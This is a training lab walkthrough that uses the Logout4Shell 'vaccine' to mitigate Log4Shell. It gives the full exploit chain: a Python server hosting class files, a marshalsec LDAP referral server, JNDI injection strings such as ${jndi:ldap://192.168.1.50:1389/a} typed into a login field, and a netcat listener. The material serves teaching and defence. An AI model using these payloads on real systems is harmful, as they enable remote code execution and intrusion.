#### Mitigation Lab Overview

In this lab, you are a threat hunter asked to test a Log4J exploit script and then take measures to mitigate the vulnerability. You will launch a lab and use the instructions that follow below. Having previously left the lab open, we will begin where we left off. (If you didn't leave the lab open, you can open it again below.)

VIRTUAL LAB

### Cybrary - Log4j

#### By Infosec Learning

1 hour 30 minutes

This virtual lab is provided by a third-party partner and will launch in a new browser tab. It may not meet all accessibility standards. Please see our [help center This link opens a new window](https://help.cybrary.it/hc/en-us/articles/1500002668302-Cybrary-s-Commitment-to-Web-Accessibility)for details.

#### Lab Instructions

Having completed the previous lab and left the lab open, we will jump right in - if the screensaver has kicked in and locked you out, re-authenticate into our kali box with the previous credentials:

- User: kali
- Password: kali

If a web browser is open when you log in and says to restore your session, simply close the web browser to proceed.

Also, be sure to close all the previously opened terminal windows before you begin.

Since this is a mitigation lab, we are going to be mitigating the Log4J vulnerability but with a catch: we will be using the vulnerability to exploit the system and patch it at the same time! This is a great way to validate that the vulnerability exists, while also actively remediating the flaw.

Once authenticated, open up a terminal if you don’t already have one up by right-clicking and selecting **Open Terminal Here**.

Once we have a terminal open, we are going to navigate to the location of our 'innoculation' payload:

```
cd ~/Desktop/Logout4Shell/target/classes
```

If you want to observe the contents of the folder or inspect the class files we are about to use, type:

```
ls -la
```

![Inspect Class Files](https://images.contentful.com/kvf8rpi09wgk/2pBCskpttXawvRTinbd65Z/fd34a38a911255db19222c87069b9852/Log4J_Image_2.2.2.png)

Image 2.2.2 - Inspecting the class files

Once we have a terminal up, we can see the class files. Like we previously did, we are going to start a python server to listen for our connections by typing:

```
python3 -m http.server 8888
```

![Python Listening](https://images.contentful.com/kvf8rpi09wgk/4JxJkx9hRTxbFLZtZT1y0f/afa3d8e6a216fd38cbc1ae80c26eca10/Log4J_Image_2.2.3.png)

Image 2.2.3 - Starting a python server for listening to connections

Now that we have our python server listening and ready to distribute our ‘vaccine’ payload, we will navigate to the marshelsec folder (as with the previous lab) and then execute the LDAP server from the marshelsec jar. Create a new tab by clicking on **File**, then selecting new tab. Then type:

```
cd ~/Desktop/marshalsec/target

java -cp marshelsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 

“http://192.168.1.50:8888/#Log4jRCEPersistent”
```

![marshelsec jar](https://images.contentful.com/kvf8rpi09wgk/5QiyMaEOyOYzMdboRbsSQ4/961181afc5e755e6a515ef6df7d57de2/Log4J_Image_2.2.4.png)

Image 2.2.4 - Executing the LDAP server from the marshelsec jar

Now that we have the payload setup, all that is left is to actually trigger the Log4j vulnerability using our previous attack string. We will navigate to the same vulnerable application location and enter the payload `${jndi:ldap://192.168.1.50:1389/a}` again.

Open a browser and type in

```
http://192.168.1.25:8080
```

![Web Browser](https://images.ctfassets.net/kvf8rpi09wgk/1ZyMe1WtolcF18lb0jcVD5/419ed48d1753ccb4335d5f04e0535e45/Open_web_browser_to_IP_address.png)

Image 2.2.5 - Web Browser

Once there, in the **Username** field, enter the following attack string and click **Login**:

```
${jndi:ldap://192.168.1.50:1389/a}
```

Now, observe the LDAP query and payload pulldown:

Image 2.2.6 - Obeserving the LDAP query and payload pulldown

We will now click our first tab and confirm the pulldown of our class:

![Class Pulldown](https://images.contentful.com/kvf8rpi09wgk/7JXQLragLHaK8Z78F0fGNr/07e4e4480b2efabd2e8a40c779fe0766/Log4J_Image_2.2.7.png)

Image 2.2.7 - Confirming the pulldown of our class

Now that we have successfully exploited the system and pushed our ‘vaccine’ payload to mitigate the vulnerability, we will attempt to exploit the system again. Create a new tab (**File, New Tab**), and open a netcat listener by typing:

```
nc -lvp 666
```

![netcat listener](https://images.contentful.com/kvf8rpi09wgk/SSC27wJDkGoDYLaXFTXwT/a6228526fca35722ee38176b46e7cf48/Log4J_Image_2.2.8.png)

Image 2.2.8 - Open a Netcat Listener

Our last step is to attempt to exploit the web application with the following test attack string:

```
${jndi:ldap://192.168.1.50:666}
```

Type the string into the same field as in the previous step and observe that we get no netcat connection:

Image 2.2.9 - Exploiting the web application + no netcat connection

Congratulations! You have successfully mitigated the Log4j vulnerability by using the actual exploit itself. Pretty cool huh? Great work!

For extra credit, feel free to look at the code for the class file we used. We can identify the location of “fullyVaccinate” within the actual template used for the lab:

```

nano ~/Desktop/Logout4Shell/src/main/java-template/Log4jRCE.java
```

Next, we will summarize what we have done, and you can look over a list of the supplemental links we've provided to do further reading and exploring related to the Log4J vulnerability.
